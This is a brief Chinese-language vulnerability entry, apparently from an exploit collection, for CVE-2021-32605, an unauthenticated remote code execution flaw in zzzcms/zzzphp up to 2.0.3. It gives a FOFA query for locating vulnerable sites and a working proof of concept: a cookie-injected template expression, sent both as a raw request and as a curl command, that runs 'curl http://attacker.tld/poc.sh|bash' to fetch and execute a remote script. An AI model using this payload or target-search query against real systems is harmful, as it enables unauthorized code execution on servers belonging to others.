# zzzcms 远程代码执行漏洞（CVE-2021-32605）


此漏洞使远程攻击者可以在受影响的zzzphp安装上执行任意代码。利用此漏洞不需要身份验证。特定缺陷存在于搜索模板的处理中。此问题是由于在处理搜索模板时缺乏对用户提供键的正确验证而导致的。攻击者可以利用此漏洞在Web服务器的上下文中执行代码。

影响版本：
zzzphp <= 2.0.3

FOFA：
app="ZZZCMS"

poc：

```
GET /?location=search HTTP/1.1
Host: target.tld
Cookie: keys={if:=`curl http://attacker.tld/poc.sh|bash`}{end if}


curl -b 'keys={if:=`curl http://attacker.tld/poc.sh|bash`}{end if}' 'http://target.tld/?location=search'
```

ref:

* http://www.zzzcms.com/a/news/31_282_1.html
* https://srcincite.io/advisories/src-2021-0015/
* https://nvd.nist.gov/vuln/detail/CVE-2021-32605